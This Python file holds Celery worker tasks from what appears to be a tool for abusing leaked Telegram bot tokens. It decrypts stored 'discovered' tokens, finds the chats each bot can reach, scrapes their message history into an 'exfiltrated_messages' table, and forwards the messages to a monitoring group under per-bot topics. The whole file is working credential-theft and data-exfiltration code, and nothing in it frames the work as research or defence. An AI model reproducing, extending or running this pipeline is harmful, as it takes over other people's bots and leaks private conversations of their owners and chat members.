import asyncio
import time
from app.workers.celery_app import app
from app.core.database import db
from app.core.security import security
from app.services.scraper_srv import scraper_service
from app.services.broadcaster_srv import broadcaster_service

@app.task(name="flow.exfiltrate_chat")
def exfiltrate_chat(cred_id: str):
    """
    1. Decrypt token.
    2. Scrape history.
    3. Save to DB.
    4. Trigger broadcast.
    """
    # Sync wrapper for async logic
    loop = asyncio.get_event_loop()
    if loop.is_closed():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    return loop.run_until_complete(_exfiltrate_logic(cred_id))

async def _exfiltrate_logic(cred_id: str):
    # Fetch credential
    response = db.table("discovered_credentials").select("bot_token, chat_id").eq("id", cred_id).execute()
    if not response.data:
        return f"Credential {cred_id} not found."
    
    record = response.data[0]
    encrypted_token = record["bot_token"]
    chat_id = record["chat_id"]
    
    # Decrypt
    try:
        bot_token = security.decrypt(encrypted_token)
    except Exception as e:
        # Invalid token or key
        db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
        return f"Decryption failed for {cred_id}: {e}"

    # Scrape
    try:
        messages = await scraper_service.scrape_history(bot_token, chat_id)
    except Exception as e:
        db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
        return f"Scraping failed: {e}"

    # Save Messages
    new_count = 0
    for msg in messages:
        msg["credential_id"] = cred_id
        # We try to insert. If duplicate (telegram_msg_id + credential_id), we should handle it.
        # Supabase/Postgres doesn't support 'ON CONFLICT' easily via simple client insert without knowing constraints.
        # But we added a unique index. So we can ignore errors or check first.
        # Efficient way: insert and ignore error.
        try:
            db.table("exfiltrated_messages").insert(msg).execute()
            new_count += 1
        except Exception:
            pass # Skip duplicate

    # Trigger Broadcast
    if new_count > 0:
        broadcast_pending.delay()

    return f"Exfiltrated {new_count} new messages."

@app.task(name="flow.enrich_credential")
def enrich_credential(cred_id: str):
    """
    1. Decrypt token.
    2. Discover chats (Enrichment).
    3. Update DB with Chat ID(s).
    4. Trigger Exfiltration.
    """
    loop = asyncio.get_event_loop()
    if loop.is_closed():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    return loop.run_until_complete(_enrich_logic(cred_id))

async def _enrich_logic(cred_id: str):
    # Fetch credential
    response = db.table("discovered_credentials").select("bot_token").eq("id", cred_id).execute()
    if not response.data:
        return f"Credential {cred_id} not found."
    
    record = response.data[0]
    
    # Decrypt
    try:
        bot_token = security.decrypt(record["bot_token"])
    except Exception as e:
        db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
        return f"Decryption failed: {e}"

    # Discover
    try:
        chats = await scraper_service.discover_chats(bot_token)
    except Exception as e:
        return f"Discovery failed: {e}"

    if not chats:
        # Valid token, but no open dialogs. 
        # Mark as 'valid_no_chats' so we know it worked but nothing to scrape.
        db.table("discovered_credentials").update({"status": "valid_no_chats"}).eq("id", cred_id).execute()
        return "Token valid, but no chats found. Status updated to 'valid_no_chats'."

    # Update Logic
    # 1. Update the ORIGINAL record with the first chat found.
    # 2. If more chats, create NEW records (clones).
    
    first_chat = chats[0]
    
    # Update primary
    db.table("discovered_credentials").update({
        "chat_id": first_chat["id"],
        "meta": {"chat_name": first_chat["name"], "type": first_chat["type"], "enriched": True}
    }).eq("id", cred_id).execute()
    
    # Trigger Exfiltration for Primary
    exfiltrate_chat.delay(cred_id)
    
    msg = f"Enriched {cred_id} with chat {first_chat['id']}."

    # Handle multiple chats
    if len(chats) > 1:
        for extra_chat in chats[1:]:
            # Check if this token+chat combo exists? 
            # Our unique constraint is on 'token_hash'. 
            # So inserting the same token again will FAIL by default.
            # We need a strategy. 
            # Option A: 'discovered_credentials' is strictly 1 row per token. 
            # If so, we can't support multiple chats per token in this schema without changing PK.
            # CURRENT SCHEMA: id (PK), bot_token, token_hash (UNIQUE).
            # Constraint: We CANNOT insert another row with same token_hash.
            
            # WORKAROUND for this MVP:
            # We will only support 1 chat (the most recent/first one) per credential.
            # Or we need to change schema.
            # Given user constraints, let's stick to 1 chat for now and log the others in meta.
            pass
            
        if len(chats) > 1:
            # Update meta with list of other chats
            all_chat_ids = [c["id"] for c in chats]
            db.table("discovered_credentials").update({
                "meta": {
                    "chat_name": first_chat["name"], 
                    "type": first_chat["type"], 
                    "enriched": True,
                    "all_chats": all_chat_ids
                }
            }).eq("id", cred_id).execute()
            msg += f" (Found {len(chats)} total chats, tracking primary only)"

    return msg

@app.task(name="flow.broadcast_pending")
def broadcast_pending():
    loop = asyncio.get_event_loop()
    if loop.is_closed():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    return loop.run_until_complete(_broadcast_logic())

async def _broadcast_logic():
    # Query pending messages
    # We want to group by credential_id to send them in order and in correct topic
    # Limit to 50 to avoid long running tasks
    response = db.table("exfiltrated_messages")\
        .select("*, discovered_credentials!inner(meta)")\
        .eq("is_broadcasted", False)\
        .order("created_at")\
        .limit(50)\
        .execute()
    
    messages = response.data
    if not messages:
        return "No pending broadcasts."

    from app.core.config import settings
    group_id = settings.MONITOR_GROUP_ID

    sent_count = 0
    for msg in messages:
        try:
            cred_id = msg["credential_id"]
            # Extract meta from the joined discovered_credentials
            # note: Supabase-py might structure nested data differently depending on version,
            # assuming 'discovered_credentials' key inside msg based on query.
            # If join fails, fall back to default.
            cred_info = msg.get("discovered_credentials", {})
            meta = cred_info.get("meta", {}) if cred_info else {}
            
            # Determine Topic Name
            # Priority: Meta Name -> Cred ID
            topic_name = meta.get("bot_name") or f"Cred-{cred_id[:8]}"
            
            # Ensure Topic
            thread_id = await broadcaster_service.ensure_topic(group_id, topic_name)
            
            # Send Message
            await broadcaster_service.send_message(group_id, thread_id, msg)
            
            # Update status
            db.table("exfiltrated_messages").update({"is_broadcasted": True}).eq("id", msg["id"]).execute()
            sent_count += 1
            
            # Rate limit (ASYNC sleep to not block the event loop)
            await asyncio.sleep(3.0) 

        except Exception as e:
            print(f"Error broadcasting msg {msg['id']}: {e}")
            # Continue to next message despite error
            continue
            
    return f"Broadcasted {sent_count} messages."
